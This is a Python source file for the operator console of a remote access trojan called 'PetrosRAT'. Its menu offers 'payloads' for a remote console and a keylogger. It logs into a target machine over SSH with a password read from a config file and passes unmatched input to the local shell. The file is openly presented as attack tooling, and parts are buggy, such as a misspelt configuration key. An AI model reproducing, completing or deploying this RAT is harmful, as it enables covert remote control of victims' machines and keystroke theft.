#!/usr/bin/python3
# python console for RAT
# created by Petros

# imports
import os
import sys
import getpass
from paramiko import SSHClient
from  modules import *



# variables
banner = """
 ___         _                    
 | _ \  ___  | |_   _ _   ___   ___
 |  _/ / -_) |  _| | '_| / _ \ (_-<
 |_|   \___|  \__| |_|   \___/ /__/
                                   
  ___     _     _____              
 | _ \   /_\   |_   _|             
 |   /  / _ \    | |               
 |_|_\ /_/ \_\   |_|               
                                   
"""
help_menu = """
        [::] The Only RAT You'le Ever Need [::]
        [::] Created by Petros [::]

        Arguments
            XXX.rat = configuration file to add to RAT

        Example:
            python3 main.py petros.rat
"""

options_menu = """
        [+] Payloads:
            [0] - Remote Console
            [1] - Keylogger
        
        [+] Options:
            [h] or [help]       -- Help Menu
            [v] or [version]    -- Version Number
            [u] or [update]     -- Update PetrosRAT
            [r] or [remove]     -- Remove PetrosRAT
            [q] or [quit]       -- Quit
            
        [*] Selecct an [option]...
            
            
"""

username = getpass.getuser() # gets username
header =f"{username}@RAT $ " # sets up user input interface
remote_path = "raw.githubusercontent.com/peterpapath/RAT/refs/heads/main" # url path for RAT files
local_path = f"/home/{username}/RAT" if username != "root" else "/root/RAT" # gets path of RAT

# read config file
def read_config(config_file):
    configuration = {}
    # get file contents
    read_lines = open(config_file, "r").readlines()

    # get target configurations
    configuration["IP ADDRESS"] = read_lines[0].strip()
    configuration["PASSWORD"] = read_lines[1].strip()
    configuration["WORIKING DIRECTORY"] = read_lines[2].strip()
    return configuration



# detects os
def os_detection():
    # windows
    if os.name == "nt":
        return "w"
    # other
    if os.name == "posix":
        return "l"


# connects RAT to target
def connect(ipv4, password):
    # remotely connect
    os.system(f"sshpass -p \"{password}\" ssh petrosrat@{ipv4} ")


# terminates the programm
def exit():
    sys.exit()


# command line interface
def cli(arguments):
    # display the banner
    print(banner)

    #if arguments exist
    if arguments:
        print(options_menu)

        config_file = input(f"{header}")

        try:
            configuration = read_config(sys.argv[1])

        except FileNotFoundError:
            print("\n[!!] File Does Not Exist [!!]")
            exit()

        # get config info
        ipv4 = configuration.get("IP ADDRESS")
        password = configuration.get("PASSWORD")
        working_directory = configuration.get("WORKING DIRECTORY")


        # remote console
        if config_file == "0":
            connect(ipv4, password)
        
        # help me
        elif config_file == "h" or config_file == "help":
            main()
            
        # get version number
        elif config_file == "v" or config_file == "version":
            os.system(f"cat {local_path}/version.txt")
            
        # update option
        elif config_file == "u" or config_file == "update":
            update()
            exit()
            
        # remove installation
        elif config_file == "r" or config_file == "remove" or config_file == "uninstall":
            remove()
            
        # quit option
        elif config_file == "q" or config_file == "quit" or config_file == "exit":
            exit()
        
        # exception
        else:
            os.system(config_file)
            
        # print new line
        print("\n")

    # if arguments dont exist
    else:
        print(help_menu)

# main code
def main():
    # checks for arguments
    try:
        sys.argv[1]
    except IndexError:
        arguments_exist = False
    else:
        arguments_exist = True
    # run command line interface
    cli(arguments_exist)

# runs main code
if __name__ == "__main__":
    main()